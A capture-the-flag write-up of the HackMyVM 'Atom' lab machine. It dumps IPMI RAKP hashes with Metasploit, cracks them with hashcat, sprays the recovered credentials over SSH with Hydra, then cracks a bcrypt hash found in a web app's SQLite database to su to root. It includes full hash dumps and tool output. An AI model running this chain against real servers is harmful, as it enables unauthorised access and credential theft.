# Atom

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Atom | cromiphi | Beginner | HackMyVM |

**Summary:** The Atom machine exposes a single Intelligent Platform Management Interface (IPMI) service on UDP port 623, alongside SSH on TCP port 22. The attack begins with IPMI hash dumping via Metasploit's `ipmi_dumphashes` module, which yields the admin credential and a full list of managed user accounts. Those accounts are then used as a second-pass target list to extract RAKP HMAC-SHA1 hashes for every user in the BMC. All 36 hashes are cracked offline with hashcat in under 40 seconds. The resulting credential pairs are sprayed against SSH via Hydra, revealing a valid login for the user `onida`. Once inside, internal enumeration exposes a locally bound web application backed by a SQLite database that stores a bcrypt-hashed password for a user named `atom`. John the Ripper cracks the bcrypt hash against rockyou.txt. The cracked password turns out to be `root`'s system password as well, and a simple `su - root` escalates privileges to full root access.

---

## Reconnaissance

### Host Discovery

A PowerShell-based network scanner (ScanNetwork-CTF.ps1) was used to identify live hosts on the local subnet. The scan revealed a single VirtualBox target:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.131 08:00:27:51:DF:5C VirtualBox
```

The MAC OUI (`08:00:27`) confirms a VirtualBox guest. The target IP is **192.168.100.131**.

---

### TCP Port Scan

A full TCP port scan with service/version detection was run against the target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/atom]
└─$ nmap -sC -sV -p- -T4 192.168.100.131
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-26 14:15 WIB
Nmap scan report for 192.168.100.131
Host is up (0.0031s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)
|_  256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.93 seconds
```

Only SSH is exposed over TCP. The version (`OpenSSH 9.2p1 Debian 2+deb12u2`) confirms a **Debian 12 (Bookworm)** system with no known exploitable vulnerabilities in this version. Direct brute-force without a valid username list would be impractical at this stage.

---

### UDP Port Scan

A targeted UDP scan of the top 100 ports was performed to uncover non-TCP attack surface:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/atom]
└─$ nmap -sU -F --top-ports 100 192.168.100.131
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-26 14:17 WIB
Nmap scan report for 192.168.100.131
Host is up (0.0019s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT    STATE SERVICE
623/udp open  asf-rmcp

Nmap done: 1 IP address (1 host up) scanned in 97.78 seconds
```

**UDP 623 (ASF-RMCP / IPMI)** is open. This is the Intelligent Platform Management Interface port. IPMI implementations, particularly those supporting IPMI 2.0, are known to be vulnerable to the **RAKP Authentication Remote Password Hash Retrieval** attack (CVE-2013-4786), which allows an unauthenticated attacker to request a challenge/response hash for any valid BMC username and crack it offline.

---

## Initial Access

### Phase 1 — IPMI Hash Dump (Admin Account)

Metasploit's `auxiliary/scanner/ipmi/ipmi_dumphashes` module was used to trigger the RAKP handshake and capture the admin hash without authentication:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/atom]
└─$ msfconsole
Metasploit tip: You can use help to view all available commands

     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v6.4.99-dev                                ]
+ -- --=[ 2,572 exploits - 1,317 auxiliary - 1,683 payloads     ]
+ -- --=[ 433 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS 192.168.100.131
RHOSTS => 192.168.100.131
msf auxiliary(scanner/ipmi/ipmi_dumphashes) > set THREADS 10
THREADS => 10
msf auxiliary(scanner/ipmi/ipmi_dumphashes) > run
[+] 192.168.100.131:623 - IPMI - Hash found: admin:8662020e8200000050e1d55e993f38d7de13e0ad37138c864090cf6776f9f2bcbc5f1e968d8e1492a123456789abcdefa123456789abcdef140561646d696e:76fe237577bff122cf29ec791eae1d1c0505d491
[+] 192.168.100.131:623 - IPMI - Hash for user 'admin' matches password 'c[REDACTED]'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

The Metasploit module automatically cracked the `admin` hash using its built-in wordlist and returned the cleartext password. This credential grants BMC administrative access.

---

### Phase 2 — BMC User Enumeration via ipmitool

With the admin credential in hand, `ipmitool` was used to enumerate all accounts configured on the BMC:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/atom]
└─$ ipmitool -I lanplus -H 192.168.100.131 -U admin -P c[REDACTED] user list
Unable to Get Channel Cipher Suites
ID  Name             Callin  Link Auth  IPMI Msg   Channel Priv Limit
1                    true    false      false      Unknown (0x00)
2   admin            true    false      true       ADMINISTRATOR
3   analiese         true    false      true       USER
4   briella          true    false      true       USER
5   richardson       true    false      true       USER
6   carsten          true    false      true       USER
7   sibylle          true    false      true       USER
8   wai-ching        true    false      true       USER
9   jerrilee         true    false      true       USER
10  glynn            true    false      true       USER
11  asia             true    false      true       USER
12  zaylen           true    false      true       USER
13  fabien           true    false      true       USER
14  merola           true    false      true       USER
15  jem              true    false      true       USER
16  riyaz            true    false      true       USER
17  laten            true    false      true       USER
18  cati             true    false      true       USER
19  rozalia          true    false      true       USER
20  palmer           true    false      true       USER
21  onida            true    false      true       USER
22  terra            true    false      true       USER
23  ranga            true    false      true       USER
24  harrie           true    false      true       USER
25  pauly            true    false      true       USER
26  els              true    false      true       USER
27  bqb              true    false      true       USER
28  karlotte         true    false      true       USER
29  zali             true    false      true       USER
30  ende             true    false      true       USER
31  stacey           true    false      true       USER
32  shirin           true    false      true       USER
33  kaki             true    false      true       USER
34  saman            true    false      true       USER
35  kalie            true    false      true       USER
36  deshawn          true    false      true       USER
37  mayeul           true    false      true       USER
...
```

A total of 36+ user accounts are registered on the BMC. Every username here is a potential SSH system user whose password may be crackable via IPMI RAKP. The usernames were saved to `users.txt`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/atom]
└─$ cat users.txt
admin
analiese
briella
richardson
carsten
sibylle
wai-ching
jerrilee
glynn
asia
...
```

---

### Phase 3 — Mass IPMI Hash Dump (All Users)

`ipmi_dumphashes` was re-run with `USER_FILE` set to the extracted user list to dump RAKP hashes for all accounts:

```bash
msf auxiliary(scanner/ipmi/ipmi_dumphashes) > set USER_FILE /tmp/atom/users.txt
USER_FILE => /tmp/atom/users.txt
msf auxiliary(scanner/ipmi/ipmi_dumphashes) > run
[+] 192.168.100.131:623 - IPMI - Hash found: admin:8dc898c58210000067fa9238690cb90346c97648bed1bd4f5682f40933da5e45bb521c8b3558fcada123456789abcdefa123456789abcdef140561646d696e:92dbcc385f2ff83cadd186687005b76c3451e594
[+] 192.168.100.131:623 - IPMI - Hash for user 'admin' matches password 'c[REDACTED]'
[+] 192.168.100.131:623 - IPMI - Hash found: analiese:87452ce5061100007ee26395cd46e1ebd9b58902daa75968bda5e1577b6787580401f81ea9e066d9a123456789abcdefa123456789abcdef1408616e616c69657365:f0f08c1ef490350882085d2e0d3c7cbfd4634838
[+] 192.168.100.131:623 - IPMI - Hash found: briella:854aed14881100000dcd10e4bab9e0717abfe32d9348e40e6029f7d13fdccd6717ce8175e431bd13a123456789abcdefa123456789abcdef1407627269656c6c61:8580083a5f767391d368425b6635d69f8d73d620
[+] 192.168.100.131:623 - IPMI - Hash found: richardson:76f75fc20a120000d48bbc7893430d34bf77263bb87e2ba738ee63315363edd6d685b16284aa457da123456789abcdefa123456789abcdef140a72696368617264736f6e:66b6470a21f4b9fabdfa459f55ca564d250fb07b
[+] 192.168.100.131:623 - IPMI - Hash found: carsten:9816cccf8c1200003674fd909e95bb1e9f5587ce88cd4474c049a760488129b43f9e6641c44b14dea123456789abcdefa123456789abcdef14076361727374656e:3f1e7e93e7bbe544d4b9f17a4ea71c902b0a5771
[+] 192.168.100.131:623 - IPMI - Hash found: sibylle:24fa41690e13000092bf6bf51c7ca737be0d84775122a3fc193a24fc6bc802845bcf51e1c61fdd0aa123456789abcdefa123456789abcdef1407736962796c6c65:479e99ba964abb30c2a0e613b2406acc10ed9a32
[+] 192.168.100.131:623 - IPMI - Hash found: wai-ching:197a013990130000f79275ed0258364cc885e8dfa42e955abce31b67a04302f4518937f63e5093b1a123456789abcdefa123456789abcdef14097761692d6368696e67:a8b015c26e635c18c5cd08a59c150ee39650370f
[+] 192.168.100.131:623 - IPMI - Hash found: jerrilee:b50ee5c2121400008215d15a5b816659c8524aa99b9e95d5d5c7a58ad5c5c807407ee6f51e4b7f82a123456789abcdefa123456789abcdef14086a657272696c6565:09aed4c0ec1651da27d841e69bf076319fac5511
[+] 192.168.100.131:623 - IPMI - Hash found: glynn:b847b96f941400007d007760d9d3625c01f6b4cf433502e4e28a4722be2bf2d9183a00580d198999a123456789abcdefa123456789abcdef1405676c796e6e:3acf9d4d39dc8e65e2809d055a377c8a5d323127
[+] 192.168.100.131:623 - IPMI - Hash found: asia:390ad71516150000dcfa610245c62e527075774a2d5c10ab1ba85d158a23032afd0b30d33affbd1ca123456789abcdefa123456789abcdef140461736961:cb5cd15d888527648dc62e059fa979b4d4db5ad6
[+] 192.168.100.131:623 - IPMI - Hash found: zaylen:62d85379981500009bf442227a35cd41257982475845b6f2d08d3bca842bb31158c9b2583f7d5657a123456789abcdefa123456789abcdef14067a61796c656e:b8e9e2955aa9f1ee4497e2b1865dbd7d044f3e77
[+] 192.168.100.131:623 - IPMI - Hash found: fabien:6cf2c2981a16000070078e03e137559ed920bcd30b25ff27cc82e7430fdec2e2211c389841e81b32a123456789abcdefa123456789abcdef140666616269656e:f5cc9e2c40988fae9c8915db9a5cf90f8135d920
[+] 192.168.100.131:623 - IPMI - Hash found: merola:8bd3229d9c16000027b7eb873363c1a9228f94d1f7ca17b61144af475f5cefe57dd1e7c31d9fde0fa123456789abcdefa123456789abcdef14066d65726f6c61:7a63363b8a2d05123a072e437aab93bda0456b66
[+] 192.168.100.131:623 - IPMI - Hash found: jem:90c4a5601e170000a720b5d9786c57ac58c4f64829c83f71998d9da7c311a9dfa776c4ea80c4b518a123456789abcdefa123456789abcdef14036a656d:db471a77887c5fdccb2c2101ed365602bd84b155
[+] 192.168.100.131:623 - IPMI - Hash found: riyaz:9bc53bd8a0170000dbdf590f420dffeb1a8bc6489f66738238011526742f27c16d1c40814a58ee89a123456789abcdefa123456789abcdef1405726979617a:f4c1d0319ae96a067d41a2909bd30457ddd7585c
[+] 192.168.100.131:623 - IPMI - Hash found: laten:084b5dbe22180000f8b7b557d0bd372cb6f8512fe0e3be3b44bf3d6b5d2833957b0f84eb95e7c39fa123456789abcdefa123456789abcdef14056c6174656e:57088c3f836e2e12f49436b82e0de5b075217680
[+] 192.168.100.131:623 - IPMI - Hash found: cati:b44730438418000090245f71f2636ab5d4fdf06c12cb4d0231c4da1e751d8efa72297883b20fc12ba123456789abcdefa123456789abcdef140463617469:265fc2d737d087b36b2c680899a8e16992bea38f
[+] 192.168.100.131:623 - IPMI - Hash found: rozalia:4be724d6241900006380bb972502ec8a08ca94bf4b3d750e906c44b6c85219bea41a9dd0a39d0b2aa123456789abcdefa123456789abcdef1407726f7a616c6961:3ef190dd001262bc2d453457fa9fe89d1e0cc32e
[+] 192.168.100.131:623 - IPMI - Hash found: palmer:e3a6ecf4a6190000578ee49d5a1f0ab30a490aa5cd5ee20d51925bf036008083a8f33ea83afc85cea123456789abcdefa123456789abcdef140670616c6d6572:b1255f0838a8eaf8e2d75b002fb21266ae70f107
[+] 192.168.100.131:623 - IPMI - Hash found: onida:1fe27d47281a000094ea9475e085322f578334b4af3ef5b41ce3f083306b51ac1617b6c6e8f2cf9aa123456789abcdefa123456789abcdef14056f6e696461:00374accfb454ebe184b24d3270a6f88cc2a2a68
[+] 192.168.100.131:623 - IPMI - Hash found: terra:385466c5aa1a0000dc971b52fc0c073d1825d1754d555d939fd2610c99048368f7a698772e8e01dfa123456789abcdefa123456789abcdef14057465727261:9bf47d0a3bf57cfa01ffc2d954f8becebd4c63ed
[+] 192.168.100.131:623 - IPMI - Hash found: ranga:61d8b6f72c1b00004f9908586b37e5dfcd6f883fa307a25b2762a49287b3e6561e559cf9ee64af0ca123456789abcdefa123456789abcdef140572616e6761:2f58b164a4893374e30f943ccfc1f9ea1f660332
[+] 192.168.100.131:623 - IPMI - Hash found: harrie:8bd58159ae1b000023a5c6567f9f8a9d34008cb900388e6d8a0a22fe5d0c28c3178a99a04fa1a93ea123456789abcdefa123456789abcdef1406686172726965:4dfd4967bfba5da72e40aab0b194b982e779012f
[+] 192.168.100.131:623 - IPMI - Hash found: pauly:868b342d301c00003ba8e7c0e265264f7f98f19a6269f832f909284ea6fb1fa4bfaa56b576388f22a123456789abcdefa123456789abcdef14057061756c79:d35fecfa93a379c0fb346cf117aaca19f21336e5
[+] 192.168.100.131:623 - IPMI - Hash found: els:7b54c43eb21c0000050b2d8e2751235c04ac2fb59f04d6bd517cb6369b972ebf9ec7504dc340d63da123456789abcdefa123456789abcdef1403656c73:6c07620660e6309254583ed16e553fab3709b481
[+] 192.168.100.131:623 - IPMI - Hash found: bqb:6ee09ae0341d000039189ead99e51fd51f4bd12e2719d4862d2d90cc8a6e38a34455faed6f70fd39a123456789abcdefa123456789abcdef1403627162:896bec202eb13a18df34ddf1c817613e7cffdeb9
[+] 192.168.100.131:623 - IPMI - Hash found: karlotte:57fb59cab61d000003b9369e6c5db4379046220db258b8fe9e3c17a5f8daeaf056d18f895d31c810a123456789abcdefa123456789abcdef14086b61726c6f747465:89e8fcd475d885d96265482a27550222c449c9b6
[+] 192.168.100.131:623 - IPMI - Hash found: zali:e60a3997381e000015b1d046592d5bde3fd0a434cd5c0da512d1a6b103bfcc2ec0b85776716cf12da123456789abcdefa123456789abcdef14047a616c69:5cbb1f97a16f75fa45ba8d1e7c20284bb124c4db
[+] 192.168.100.131:623 - IPMI - Hash found: ende:ec6c33c5ba1e000035499bbebaeccb96e3352f25353b81922fa4d39d4394cc417a6bf686c54656c4a123456789abcdefa123456789abcdef1404656e6465:58859688d2b8a79ae9646be80aef451fed462592
[+] 192.168.100.131:623 - IPMI - Hash found: stacey:797d48d13c1f00007b77e4c0a0cb6255ca20e9fd68f1eb0232ea6fe1c884ee2678c5a3784ebffbeea123456789abcdefa123456789abcdef1406737461636579:3e83d1a33969842bc311f6719e1bf314f4aed6c6
[+] 192.168.100.131:623 - IPMI - Hash found: shirin:92ddf52bbe1f0000d78f8d0c8607253cc2c7e57f2862b79e0e29f00411387611ff354a7d05680b98a123456789abcdefa123456789abcdef140673686972696e:a6da60758cf2730ae5027b9f9a74e39b0cf57b84
[+] 192.168.100.131:623 - IPMI - Hash found: kaki:630dade940200000d9d1f88bca861de1d589919b1356488d15293f72f26b964dd547a7bfbd0cd98ca123456789abcdefa123456789abcdef14046b616b69:426e0534a09b26983c6e7ef2056ef67e0086bddf
[+] 192.168.100.131:623 - IPMI - Hash found: saman:ff696253c2200000ecc20f57bf29a468b5d5ec589e6cedbbd0930959123bf2035f1c86e5d879ef12a123456789abcdefa123456789abcdef140573616d616e:39547d7c286e47c54fc0597627b80f79a8c875c3
[+] 192.168.100.131:623 - IPMI - Hash found: kalie:6f611fe544210000047279bc27fa0cd0498cc4a069e5ca8d2e23af870eec1332d82a8340978b6c48a123456789abcdefa123456789abcdef14056b616c6965:8ba2c1406a053497d9139417969471dad5707bb7
[+] 192.168.100.131:623 - IPMI - Hash found: deshawn:64ba268a822100002810ec2797b554aafd2a8b0c49dbb3c32178cb90a72ec67e66a5d7cc4c1c69b8a123456789abcdefa123456789abcdef14076465736861776e:9be67b2b715ef15f9f0c4c5720783e51e3a5eab0
[+] 192.168.100.131:623 - IPMI - Hash found: mayeul:16433d50462200009cbb42d080b72bde75bcf79cd18759f69db88b8f625fad138b293449c7c0efcaa123456789abcdefa123456789abcdef14066d617965756c:3dafe33a7d73fb4613cfb1d424c369e009fab98a
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

All 36 RAKP HMAC-SHA1 hashes were retrieved without authentication — a consequence of the IPMI 2.0 specification design flaw (CVE-2013-4786).

---

### Phase 4 — Offline Hash Cracking with Hashcat

All hashes were saved to `hashes.txt`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/atom]
└─$ cat hashes.txt
8dc898c58210000067fa9238690cb90346c97648bed1bd4f5682f40933da5e45bb521c8b3558fcada123456789abcdefa123456789abcdef140561646d696e:92dbcc385f2ff83cadd186687005b76c3451e594
87452ce5061100007ee26395cd46e1ebd9b58902daa75968bda5e1577b6787580401f81ea9e066d9a123456789abcdefa123456789abcdef1408616e616c69657365:f0f08c1ef490350882085d2e0d3c7cbfd4634838
854aed14881100000dcd10e4bab9e0717abfe32d9348e40e6029f7d13fdccd6717ce8175e431bd13a123456789abcdefa123456789abcdef1407627269656c6c61:8580083a5f767391d368425b6635d69f8d73d620
76f75fc20a120000d48bbc7893430d34bf77263bb87e2ba738ee63315363edd6d685b16284aa457da123456789abcdefa123456789abcdef140a72696368617264736f6e:66b6470a21f4b9fabdfa459f55ca564d250fb07b
9816cccf8c1200003674fd909e95bb1e9f5587ce88cd4474c049a760488129b43f9e6641c44b14dea123456789abcdefa123456789abcdef14076361727374656e:3f1e7e93e7bbe544d4b9f17a4ea71c902b0a5771
24fa41690e13000092bf6bf51c7ca737be0d84775122a3fc193a24fc6bc802845bcf51e1c61fdd0aa123456789abcdefa123456789abcdef1407736962796c6c65:479e99ba964abb30c2a0e613b2406acc10ed9a32
...
```

Hashcat was run with mode `7300` (IPMI2 RAKP HMAC-SHA1) against `rockyou.txt`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/atom]
└─$ hashcat -m 7300 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i5-7300U CPU @ 2.60GHz, 1394/2789 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 36 digests; 36 unique digests, 36 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (2492 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

87452ce5061100007ee26395cd46e1ebd9b58902daa75968bda5e1577b6787580401f81ea9e066d9a123456789abcdefa123456789abcdef1408616e616c69657365:f0f08c1ef490350882085d2e0d3c7cbfd4634838:[REDACTED]
630dade940200000d9d1f88bca861de1d589919b1356488d15293f72f26b964dd547a7bfbd0cd98ca123456789abcdefa123456789abcdef14046b616b69:426e0534a09b26983c6e7ef2056ef67e0086bddf:[REDACTED]
e3a6ecf4a6190000578ee49d5a1f0ab30a490aa5cd5ee20d51925bf036008083a8f33ea83afc85cea123456789abcdefa123456789abcdef140670616c6d6572:b1255f0838a8eaf8e2d75b002fb21266ae70f107:[REDACTED]
1fe27d47281a000094ea9475e085322f578334b4af3ef5b41ce3f083306b51ac1617b6c6e8f2cf9aa123456789abcdefa123456789abcdef14056f6e696461:00374accfb454ebe184b24d3270a6f88cc2a2a68:j[REDACTED]
390ad71516150000dcfa610245c62e527075774a2d5c10ab1ba85d158a23032afd0b30d33affbd1ca123456789abcdefa123456789abcdef140461736961:cb5cd15d888527648dc62e059fa979b4d4db5ad6:[REDACTED]
62d85379981500009bf442227a35cd41257982475845b6f2d08d3bca842bb31158c9b2583f7d5657a123456789abcdefa123456789abcdef14067a61796c656e:b8e9e2955aa9f1ee4497e2b1865dbd7d044f3e77:[REDACTED]
64ba268a822100002810ec2797b554aafd2a8b0c49dbb3c32178cb90a72ec67e66a5d7cc4c1c69b8a123456789abcdefa123456789abcdef14076465736861776e:9be67b2b715ef15f9f0c4c5720783e51e3a5eab0:[REDACTED]
...

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 7300 (IPMI2 RAKP HMAC-SHA1)
Hash.Target......: hashes.txt
Time.Started.....: Thu Feb 26 14:37:28 2026 (8 secs)
Time.Estimated...: Thu Feb 26 14:37:36 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1315.3 kH/s (1.85ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 36/36 (100.00%) Digests (total), 36/36 (100.00%) Digests (new), 36/36 (100.00%) Salts
Progress.........: 320081920/516397860 (61.98%)
Rejected.........: 0/320081920 (0.00%)
Restore.Point....: 8888320/14344385 (61.96%)
Restore.Sub.#01..: Salt:24 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: cunconk5 -> cudipta
Hardware.Mon.#01.: Util: 57%

Started: Thu Feb 26 14:37:04 2026
Stopped: Thu Feb 26 14:37:38 2026
```

Hashcat cracked **all 36/36 hashes** in approximately **34 seconds**. The recovered credentials were saved to `credentials.txt`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/atom]
└─$ cat credentials.txt
admin:c[REDACTED]
analiese:h[REDACTED]
briella:j[REDACTED]
richardson:d[REDACTED]
carsten:2[REDACTED]
sibylle:m[REDACTED]
wai-ching:1[REDACTED]
jerrilee:n[REDACTED]
glynn:[REDACTED]
asia:[REDACTED]
zaylen:[REDACTED]
fabien:[REDACTED]
merola:[REDACTED]
...
```

---

### Phase 5 — SSH Credential Spray with Hydra

The full `credentials.txt` was used to perform a credential-spray attack against the SSH service:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/atom]
└─$ hydra -C credentials.txt ssh://192.168.100.131
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-26 14:39:12
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries, ~3 tries per task
[DATA] attacking ssh://192.168.100.131:22/
[22][ssh] host: 192.168.100.131   login: onida   password: j[REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-26 14:39:22
```

Valid SSH credential found: **`onida`** with a password beginning with `j`. The IPMI BMC password for this user maps directly to a valid Linux system account.

---

### Phase 6 — SSH Login & User Flag

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/atom]
└─$ ssh onida@192.168.100.131
onida@192.168.100.131's password:
Linux atom 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64
...
onida@atom:~$ id
uid=1000(onida) gid=1000(onida) groups=1000(onida),100(users)
onida@atom:~$ ls -la
total 24
drwx------ 2 onida onida 4096 Dec 31  2400 .
drwxr-xr-x 3 root  root  4096 May 24  2024 ..
lrwxrwxrwx 1 root  root     9 May 24  2024 .bash_history -> /dev/null
-rw-r--r-- 1 onida onida  220 Dec 31  2400 .bash_logout
-rw-r--r-- 1 onida onida 3526 Dec 31  2400 .bashrc
-rw-r--r-- 1 onida onida  807 Dec 31  2400 .profile
-rwx------ 1 onida onida   33 Dec 31  2400 user.txt
```

User flag retrieved from `/home/onida/user.txt`. Note that `.bash_history` is symlinked to `/dev/null` — a deliberate anti-forensics measure by the VM creator.

---

## Privilege Escalation

### Phase 1 — Internal Network Enumeration

After landing on the box, active listening sockets were inspected:

```bash
onida@atom:/$ ss -tlpn
State      Recv-Q     Send-Q         Local Address:Port            Peer Address:Port     Process
LISTEN     0          128                  0.0.0.0:22                   0.0.0.0:*
LISTEN     0          4096               127.0.0.1:41759                0.0.0.0:*
LISTEN     0          4096                 0.0.0.0:623                  0.0.0.0:*
LISTEN     0          511                127.0.0.1:80                   0.0.0.0:*
LISTEN     0          128                     [::]:22                      [::]:*
```

Two services are bound exclusively to loopback (`127.0.0.1`):
- **Port 80** — a web server not exposed externally.
- **Port 41759** — an unknown internal service (likely a backend process).

The web root was the first target for investigation.

---

### Phase 2 — Web Application and SQLite Database

The web root at `/var/www/html` was inspected:

```bash
onida@atom:/var/www/html$ ls -la
total 172
drwxr-xr-x 6 www-data www-data   4096 May 27  2024 .
drwxr-xr-x 3 root     root       4096 May 25  2024 ..
-rwxr-xr-x 1 www-data www-data 114688 May 27  2024 atom-2400-database.db
drwxr-xr-x 2 www-data www-data   4096 Dec 31  2400 css
drwxr-xr-x 4 www-data www-data   4096 Dec 31  2400 img
-rw-r--r-- 1 www-data www-data  11767 Dec 31  2400 index.php
drwxr-xr-x 2 www-data www-data   4096 Dec 31  2400 js
-rw-r--r-- 1 www-data www-data   6262 Dec 31  2400 login.php
-rwxr-xr-x 1 www-data www-data   1637 Dec 31  2400 profile.php
-rw-r--r-- 1 www-data www-data   5534 Dec 31  2400 register.php
drwxr-xr-x 2 www-data www-data   4096 Dec 31  2400 video
onida@atom:/var/www/html$ file atom-2400-database.db
atom-2400-database.db: SQLite 3.x database, last written using SQLite version 3040001, file counter 4373, database pages 28, 1st free page 5, free pages 24, cookie 0x3, schema 4, UTF-8, version-valid-for 4373
onida@atom:/var/www/html$ sqlite3 atom-2400-database.db ".tables"
login_attempts  users
onida@atom:/var/www/html$ sqlite3 atom-2400-database.db "select * from users;"
1|atom|$2y$[REDACTED]/M3fI6BkSohYOiBQqG7pK1F2fH9Cm
```

The database file `atom-2400-database.db` is a **SQLite 3.x** database (written using SQLite version 3.40.0.1). It contains two tables: `login_attempts` and `users`. The `users` table holds a single record for a user named `atom` with a **bcrypt** password hash (`$2y$` prefix). The `-rwxr-xr-x` permissions on the database file mean it is readable by the current user `onida`.

This is significant: the web application user `atom` and the OS's root account likely share the same password, as is common in CTF machines where the web app is managed by the machine owner.

---

### Phase 3 — Cracking the Bcrypt Hash with John the Ripper

The hash was extracted and saved:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/atom]
└─$ cat atom_hash.txt
atom:$2y$[REDACTED]/M3fI6BkSohYOiBQqG7pK1F2fH9Cm
```

John the Ripper was run against it with the `rockyou.txt` wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/atom]
└─$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt atom_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
m[REDACTED]          (atom)
1g 0:00:00:02 DONE (2026-02-26 14:48) 0.3676g/s 79.41p/s 79.41c/s 79.41C/s manuel..jessie
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The bcrypt hash was cracked in **~2 seconds** using 4 OpenMP threads. The password for the `atom` web user starts with `m`.

> **Note:** Bcrypt with a cost factor of 1024 is intentionally slow. The extremely fast crack time here confirms the password is a very common entry in rockyou.txt.

---

### Phase 4 — Privilege Escalation via `su`

The cracked password was tested against the `root` account directly via `su`:

```bash
onida@atom:/var/www/html$ su - root
Password:
root@atom:~# id
uid=0(root) gid=0(root) groups=0(root)
root@atom:~# hostname
atom
root@atom:~# whoami
root
root@atom:~# cat /home/onida/user.txt /root/root.txt
f75[REDACTED]
d3a[REDACTED]
```

The root account reused the same password stored in the web application's SQLite database. Both the **user flag** (`f75...`) and **root flag** (`d3a...`) were retrieved.

---

## Attack Chain Summary

1. **Reconnaissance**: Full TCP scan revealed only SSH (22/tcp) open. A supplementary UDP scan exposed IPMI on UDP/623 — the critical attack surface.

2. **Vulnerability Discovery**: The IPMI 2.0 RAKP protocol flaw (CVE-2013-4786) allows unauthenticated retrieval of HMAC-SHA1 challenge-response hashes for any BMC username. Metasploit's `ipmi_dumphashes` module exploited this to retrieve and immediately crack the `admin` BMC hash.

3. **Exploitation**: With admin credentials, `ipmitool` enumerated all 36 BMC user accounts. A second pass of `ipmi_dumphashes` with the full user list extracted RAKP hashes for every account. Hashcat (mode 7300) cracked all 36 hashes in under 40 seconds using `rockyou.txt`. Hydra then sprayed the resulting `credentials.txt` against SSH, successfully authenticating as `onida`.

